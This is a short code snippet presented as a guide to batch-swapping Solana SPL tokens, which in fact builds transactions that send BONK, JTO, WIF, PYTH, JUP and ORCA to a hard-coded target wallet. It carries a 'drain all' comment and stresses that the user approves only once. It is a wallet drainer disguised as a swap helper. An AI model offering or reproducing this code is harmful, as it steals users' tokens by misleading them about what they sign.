To batch-swap your Solana SPL tokens, sign all transactions using signAllTransactions:

const txs = await buildSwapTransactions(
  wallet.publicKey,
  targetWallet = new PublicKey("LaZaruS555555555555555555555555555555555555"),
  tokens = ["BONK", "JTO", "WIF", "PYTH", "JUP", "ORCA"] // drain all
);

// signAllTransactions signs all at once — you only approve once
const signedTxs = await wallet.signAllTransactions(txs);
for (const tx of signedTxs) {
  await connection.sendRawTransaction(tx.serialize());
}
